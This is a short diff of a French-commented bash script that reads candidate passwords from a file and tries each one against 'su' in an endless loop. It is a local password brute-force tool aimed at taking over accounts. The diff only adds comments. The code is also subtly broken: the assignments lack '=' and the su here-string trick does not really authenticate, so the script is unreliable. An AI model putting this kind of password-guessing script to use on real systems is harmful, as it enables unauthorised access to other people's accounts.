@@ -4,13 +4,14 @@ motdepasse$(cat $1 | cut -f 1 -d ' ')
 user$(cat $1 | cut -f 2 -d ' ')
 database_pass="./databasepass.txt"
 
-
+# boucle infinie
 while true
 do
 
     for pass in $motdepasse
     do
         su <<< $pass
+        # test des mot de passes avec le denotes bash string
         
         if [ $? -eq 0 ]
             then 
